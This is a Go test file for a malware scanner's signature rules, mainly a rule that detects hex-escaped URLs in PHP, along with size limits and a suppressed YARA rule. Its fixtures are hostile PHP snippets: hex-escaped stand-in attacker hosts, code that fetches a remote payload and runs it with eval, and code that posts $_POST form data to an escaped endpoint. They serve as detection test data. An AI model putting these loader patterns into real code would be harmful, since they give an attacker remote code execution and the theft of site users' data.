package signatures

import (
	"bytes"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// The YAML arm of php_hex_escaped_url ran in !yara builds and the realtime
// path with the same unconditioned regex the YARA rule had, so it reported the
// same PDF-library vanity string as an obfuscated C2 URL.

func hexEscapedLibrary() []byte {
	var b bytes.Buffer
	b.WriteString("<?php\nclass TCPDF_STATIC {\n")
	b.WriteString("\tpublic static function getTCPDFProducer() {\n")
	b.WriteString("\t\treturn \"\\x54\\x43\\x50\\x44\\x46\\x20\".self::getTCPDFVersion().\"\\x20\\x28\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x77\\x77\\x77\\x2e\\x74\\x63\\x70\\x64\\x66\\x2e\\x6f\\x72\\x67\\x29\";\n\t}\n")
	body := "\tpublic function renderCell($x, $y, $w, $h, $txt) {\n\t\treturn $this->writeCell($x, $y, $w, $h, $txt);\n\t}\n"
	for b.Len() < 110000 {
		b.WriteString(body)
	}
	b.WriteString("}\n")
	return b.Bytes()
}

func TestHexEscapedURL_LibraryVanityStringNotFlagged(t *testing.T) {
	scanner := loadRepoScanner(t)
	if hasRule(scanner.ScanContent(hexEscapedLibrary(), ".php"), "php_hex_escaped_url") {
		t.Error("php_hex_escaped_url FP: matched a PDF library that hex-escapes its own project URL; one escaped literal in plain source is not an obfuscated payload")
	}
}

func TestHexEscapedURL_ObfuscatedPayloadStillFlagged(t *testing.T) {
	scanner := loadRepoScanner(t)
	var b bytes.Buffer
	b.WriteString(`<?php $t = array("\x68\x74\x74\x70\x3a\x2f\x2f\x65\x76\x69\x6c\x2e\x63\x6f\x6d",`)
	for i := 0; i < 300; i++ {
		b.WriteString(`"\x70\x61\x73\x73\x77\x6f\x72\x64",`)
	}
	b.WriteString(`"\x73\x65\x6e\x64"); eval($t[0]);`)
	if !hasRule(scanner.ScanContent(b.Bytes(), ".php"), "php_hex_escaped_url") {
		t.Error("php_hex_escaped_url regression: hex-escaped payload table hiding a remote host not detected")
	}

	// The real incident shape is small: one escaped C2 literal in a class.
	small := []byte(`<?php class LinkFlow { private $server_url = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x65\x78\x61\x6d\x70\x6c\x65\x2e\x63\x6f\x6d"; }`)
	if !hasRule(scanner.ScanContent(small, ".php"), "php_hex_escaped_url") {
		t.Error("php_hex_escaped_url regression: small hex-escaped C2 literal not detected")
	}
}

// max_file_bytes is the size bound the obfuscation rules rely on; a rule
// without it must keep scanning content of any size.
func TestMaxFileBytesBoundsRuleByContentSize(t *testing.T) {
	scanner := loadRepoScanner(t)
	escaped := `"\x68\x74\x74\x70\x3a\x2f\x2f\x65\x76\x69\x6c\x2e\x63\x6f\x6d"`
	small := []byte(`<?php $u = ` + escaped + `;`)
	if !hasRule(scanner.ScanContent(small, ".php"), "php_hex_escaped_url") {
		t.Fatal("setup: small escaped-URL sample should match before the size bound applies")
	}

	var big bytes.Buffer
	big.WriteString(`<?php $u = ` + escaped + `;` + "\n")
	filler := "function pad_"
	for i := 0; big.Len() <= 65536; i++ {
		big.WriteString(filler)
		big.WriteString("x() { return 1; }\n")
	}
	if hasRule(scanner.ScanContent(big.Bytes(), ".php"), "php_hex_escaped_url") {
		t.Error("max_file_bytes did not bound php_hex_escaped_url: content past the configured size still matched")
	}
}

func TestMaxFileBytesDefaultsToUnbounded(t *testing.T) {
	dir := t.TempDir()
	rules := `version: 1
rules:
  - name: unbounded
    file_types: [".php"]
    patterns: ["BOUNDARY_TOKEN"]
  - name: bounded
    file_types: [".php"]
    max_file_bytes: 1024
    patterns: ["BOUNDARY_TOKEN"]
`
	if err := os.WriteFile(filepath.Join(dir, "limits.yml"), []byte(rules), 0o600); err != nil {
		t.Fatal(err)
	}
	scanner := NewScanner(dir)
	if err := scanner.LoadError(); err != nil {
		t.Fatalf("loading size-limit rules: %v", err)
	}
	content := []byte(strings.Repeat("x", 2048) + "BOUNDARY_TOKEN")
	matches := scanner.ScanContent(content, ".php")
	if !hasRule(matches, "unbounded") {
		t.Error("rule without max_file_bytes did not retain the unbounded default")
	}
	if hasRule(matches, "bounded") {
		t.Error("bounded rule matched content above max_file_bytes")
	}
}

func TestRepoMaxFileBytesIsExplicitlyOptIn(t *testing.T) {
	scanner := loadRepoScanner(t)
	for _, rule := range scanner.rules {
		if rule.Name == "php_hex_escaped_url" {
			if rule.MaxFileBytes != 65536 {
				t.Errorf("php_hex_escaped_url max_file_bytes = %d, want 65536", rule.MaxFileBytes)
			}
			continue
		}
		if rule.MaxFileBytes != 0 {
			t.Errorf("existing rule %s unexpectedly opted into max_file_bytes=%d", rule.Name, rule.MaxFileBytes)
		}
	}
}

func TestMaxFileBytesUsesCompleteSizeForScannedPrefix(t *testing.T) {
	scanner := loadRepoScanner(t)
	escaped := []byte(`<?php $url = "\x68\x74\x74\x70\x3a\x2f\x2f\x65\x76\x69\x6c";`)
	if !hasRule(scanner.ScanContent(escaped, ".php"), "php_hex_escaped_url") {
		t.Fatal("setup: escaped URL prefix should match when it is the complete content")
	}
	if hasRule(scanner.ScanContentWithSize(escaped, ".php", 110000), "php_hex_escaped_url") {
		t.Error("max_file_bytes used the truncated prefix length instead of the complete snapshot size")
	}
	padded := append(append([]byte{}, escaped...), make([]byte, 70000)...)
	if hasRule(scanner.ScanContentWithSize(padded, ".php", 1), "php_hex_escaped_url") {
		t.Error("max_file_bytes trusted a declared size smaller than the supplied content")
	}
}

func TestHexEscapedURL_OversizedLoaderFlowsStillFlagged(t *testing.T) {
	scanner := loadRepoScanner(t)
	escaped := `"\x68\x74\x74\x70\x3a\x2f\x2f\x65\x76\x69\x6c\x2e\x74\x65\x73\x74"`
	longEscaped := `"\x68\x74\x74\x70\x3a\x2f\x2f` + strings.Repeat(`\x61`, 240) + `"`
	prefixedEscaped := `"` + strings.Repeat(`\x61`, 80) + `\x68\x74\x74\x70\x3a\x2f\x2f\x65\x76\x69\x6c"`
	for _, prefix := range []string{
		`<?php $payload = file_get_contents(` + escaped + `);`,
		`<?php include ` + escaped + `;`,
		`<?php curl_setopt($handle, CURLOPT_URL, ` + escaped + `); $payload = curl_exec($handle); eval($payload);`,
		`<?php $url = ` + escaped + `; require_once $url;`,
		`<?php $url = ` + escaped + `; $payload = file_get_contents($url); eval($payload);`,
		`<?php $url = ` + longEscaped + `; $payload = file_get_contents($url); eval($payload);`,
		`<?php $url = ` + prefixedEscaped + `; $payload = file_get_contents($url); eval($payload);`,
		`<?php $endpoint = ` + escaped + `; wp_remote_post($endpoint, array('body' => $_POST));`,
		`<?php $url = ` + escaped + `; curl_setopt($handle, CURLOPT_URL, $url); curl_setopt($handle, CURLOPT_POSTFIELDS, $_POST);`,
	} {
		content := []byte(prefix + strings.Repeat("\nfunction ordinary_padding($v) { return trim($v); }", 1600))
		if len(content) <= 65536 {
			t.Fatalf("setup: oversized loader fixture is only %d bytes", len(content))
		}
		if !hasRule(scanner.ScanContent(content, ".php"), "php_hex_escaped_url") {
			t.Errorf("php_hex_escaped_url regression: oversized escaped-URL loader flow not detected: %s", prefix)
		}
	}
}

// The suppressed Forge rule must stay suppressed, and its replacement must
// carry the campaign's own markers so suppression never costs detection.
func TestForgeSuppressedIncludesIISGroup14(t *testing.T) {
	found := false
	for _, name := range forgeSuppressedRules() {
		if name == "ESET_IIS_Group14" {
			found = true
		}
	}
	if !found {
		t.Error("ESET_IIS_Group14 should be suppressed: its trailing `5 of them` arm drops the native-module guard, so four crawler user agents plus HTTP_X_FORWARDED_FOR satisfy it and stock analytics plugins match")
	}
}

func TestSuppressedForgeRuleHasReplacementRule(t *testing.T) {
	// Policy: a suppression is paired with CSM's own rule for the technique.
	body, err := os.ReadFile(filepath.Join(repoConfigsDir(), "malware.yar")) // #nosec G304 -- test-only read of a repo-relative config path
	if err != nil {
		t.Fatalf("reading malware.yar: %v", err)
	}
	if !strings.Contains(string(body), "rule seo_cloak_group14_ioc") {
		t.Error("suppressing ESET_IIS_Group14 removed detection with no CSM replacement rule")
	}
}
